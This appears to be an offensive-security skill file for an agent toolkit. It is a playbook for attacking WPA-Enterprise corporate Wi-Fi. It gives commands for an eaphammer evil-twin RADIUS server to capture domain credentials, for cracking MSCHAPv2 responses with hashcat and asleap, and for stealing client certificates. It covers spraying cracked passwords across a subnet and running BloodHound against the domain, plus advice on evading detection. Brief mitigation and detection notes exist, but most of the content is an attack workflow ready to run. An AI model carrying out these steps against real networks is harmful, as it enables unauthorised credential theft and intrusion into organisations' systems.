---
name: offensive-wpa-enterprise
description: WPA/WPA2/WPA3-Enterprise (802.1X / EAP) attack methodology — EAP method
  identification (PEAP-MSCHAPv2, EAP-TTLS, EAP-TLS, EAP-GTC, EAP-PWD, EAP-FAST), evil-twin
  RADIUS attacks with eaphammer for credential capture, MSCHAPv2 challenge-response
  cracking, EAP-TLS client certificate theft paths (DPAPI, NDES, AD CS auto-enrollment),
  supplicant validation bypass (missing server cert validation, missing CN pinning,
  BYOD misconfigurations), and post-capture pivots into AD via cracked domain credentials.
  Use for corporate Wi-Fi engagements where the network is 802.1X authenticated.
---

# WPA-Enterprise (802.1X / EAP) Attacks

Enterprise Wi-Fi delegates authentication to a RADIUS server — usually backed by AD. The PSK doesn't exist. Instead, you attack the supplicant's trust in the server certificate, the inner EAP method's crypto, or the cert-issuance path.

## Quick Workflow

1. Identify EAP method from beacons + initial EAP-Request/Identity
2. If MSCHAPv2-based (PEAP, TTLS): rogue RADIUS to capture challenge-response
3. If EAP-TLS: target the cert-issuance / cert-storage path (out of band)
4. Crack captured MSCHAPv2 offline → AD username + password
5. Pivot into the domain (see `offensive-active-directory` and `offensive-network`)

---

## EAP Method Identification

```bash
# Watch 802.1X exchange in monitor mode
sudo tshark -i wlan0mon -Y "eapol || eap" -V

# Or capture and analyze
sudo airodump-ng wlan0mon -c <ch> --bssid <BSSID> -w eap_capture
# When client associates, read the EAP-Request/Identity and Type fields
wireshark eap_capture-01.cap
```

| EAP Type | Identifier | Common Inner |
|---|---|---|
| 13 | EAP-TLS | Client + server certs |
| 17 | LEAP | (legacy, weak) |
| 21 | EAP-TTLS | MSCHAPv2 / PAP / CHAP / GTC |
| 25 | PEAP | MSCHAPv2 (PEAPv0/MS) / GTC (PEAPv0/Cisco) |
| 43 | EAP-FAST | MSCHAPv2 (PAC-protected) |
| 47 | EAP-PWD | (Dragonblood-class research target) |

## Evil-Twin RADIUS (PEAP-MSCHAPv2 / TTLS-MSCHAPv2)

The most common attack path against corporate Wi-Fi.

```bash
# eaphammer — automated rogue AP + RADIUS
eaphammer --cert-wizard                          # generate self-signed cert (first run)
eaphammer -i wlan0 \
  --essid CorpWiFi \
  --bssid AA:BB:CC:DD:EE:FF \
  --auth wpa-eap \
  --creds
```

When a client associates, eaphammer logs:

```
[*] User: corp.local\jdoe
[*] Challenge: 1122334455667788
[*] Response: aabbccdd...
```

Crack offline:

```bash
# asleap — designed for MSCHAPv2 challenge/response
asleap -C 1122334455667788 -R aabbccdd... -W rockyou.txt

# Or hashcat mode 5500 (NetNTLMv1 / MSCHAPv2)
hashcat -m 5500 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
```

The captured response is equivalent to NetNTLMv1 — feed it to a rainbow-table service (`crack.sh`) for guaranteed crack at moderate cost.

## Why Evil-Twin Works

The MSCHAPv2 inner exchange is encrypted in a TLS tunnel between the supplicant and the (real or fake) RADIUS server. If the supplicant doesn't validate:

- The CA chain on the RADIUS server certificate (most BYOD configurations)
- The CN / SAN of the RADIUS server certificate (often unenforced even with CA validation)

Then a self-signed cert is accepted, the tunnel is established with the attacker, and MSCHAPv2 happens inside.

**Mitigation defenders should use:**
- Push GPO requiring server cert validation
- Pin trusted CA + RADIUS server CN explicitly
- For BYOD, enrollment via SCEP/Intune that locks supplicant settings

## Supplicant Validation Bypass

### Windows

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Group Policy Objects\...
```

Look at the deployed wireless profile XML. Critical fields:

```xml
<ServerValidation>
  <DisableUserPromptForServerValidation>true</DisableUserPromptForServerValidation>
  <ServerNames>radius.corp.local</ServerNames>
  <TrustedRootCA>...thumbprint...</TrustedRootCA>
</ServerValidation>
```

If `ServerNames` is missing or wildcard'd, evil-twin will succeed.

### iOS / macOS / Android (BYOD)

Manual entry → users typically click "Trust" on the certificate prompt the first time, including for the evil twin. After that the supplicant trusts the attacker cert by hash. Many BYOD networks rely on this acceptance without controlling the trust anchor.

## EAP-TLS Targets

EAP-TLS uses client certificates instead of passwords — there's nothing to crack from the wire. Attack vectors:

### Cert Theft from User Profile

- DPAPI master key + cert blob on Windows
  - `%APPDATA%\Microsoft\SystemCertificates\My\Certificates\`
  - Decrypt with DPAPI master key (requires user logon context or master key)
- macOS Keychain (login keychain) — local user access
- Android KeyStore — root + Frida hooks (see `offensive-mobile`)
- iOS — Keychain item with appropriate access group entitlement

### NDES / SCEP Misconfig

If the network uses SCEP for cert provisioning:

```bash
# Discover NDES endpoint (often /certsrv/mscep/mscep.dll)
curl -I http://ndes.corp.local/certsrv/mscep/mscep.dll

# Enroll with stolen / weak challenge password
sscep enroll -c ca.crt -k client.key -r request.csr \
  -u http://ndes.corp.local/certsrv/mscep/mscep.dll \
  -l client.crt -E 3des -S sha1
```

### AD CS Auto-Enrollment with Permissive ACL

Domain users with `Enroll` permission on a Client Authentication template can mint their own certs. See `offensive-active-directory` for ESC1-class attacks.

## EAP-GTC

If GTC is offered (rare, often Cisco environments), the inner exchange is **plain text**. A successful evil-twin captures the password directly with no offline cracking needed. eaphammer captures GTC the same way as MSCHAPv2.

## Post-Crack Pivot

A cracked MSCHAPv2 yields `corp.local\jdoe : Password123!`. From there:

```bash
# Validate against AD
nxc smb dc.corp.local -u jdoe -p 'Password123!' -d corp.local

# Spray against other systems
nxc smb 10.0.0.0/24 -u jdoe -p 'Password123!' -d corp.local

# Initial AD enum
bloodhound-python -d corp.local -u jdoe -p 'Password123!' -ns dc.corp.local -c All
```

Hand off to the AD attack chain (`offensive-active-directory`, `offensive-network`).

## Detection Considerations

| Signal | Defender View |
|---|---|
| Rogue RADIUS server ESSID | WIPS rule: AP impersonation by ESSID/BSSID delta |
| Repeated MSCHAPv2 failures | RADIUS log: increased auth failures from one supplicant |
| Cert mismatch failures | Modern Windows endpoints log to Event Viewer (Wi-Fi 11005) |
| Captured user complaint | Users may report a "weird Wi-Fi prompt" — most don't |

To minimize: match the legitimate AP's BSSID exactly (spoofed MAC), use a CA-signed cert that mimics the real RADIUS CN if you can obtain one, time the attack during known disruption windows (lunch / start of day) to blend with reconnections.

## Engagement Cheatsheet

```bash
# 1. Identify EAP method
sudo tshark -i wlan0mon -Y "eap" -V | grep -E "(Type:|Identity)"

# 2. Run eaphammer evil twin
eaphammer --cert-wizard
eaphammer -i wlan0 --essid <CorpWiFi> --bssid <BSSID> --auth wpa-eap --creds

# 3. As clients connect, capture MSCHAPv2 challenges
# Watch eaphammer console for User/Challenge/Response

# 4. Crack offline
hashcat -m 5500 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule
# Or asleap -C <chal> -R <resp> -W wordlist

# 5. Validate creds against domain
nxc smb <dc> -u <user> -p <pass> -d <domain>

# 6. Hand off to AD chain
```

---

## Key References

- eaphammer: github.com/s0lst1c3/eaphammer
- asleap: willhackforsushi.com/asleap
- crack.sh — NetNTLMv1 (MSCHAPv2) rainbow service
- RFC 3748 (EAP), RFC 5216 (EAP-TLS), RFC 7170 (EAP-TEAP)
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/wireless.md
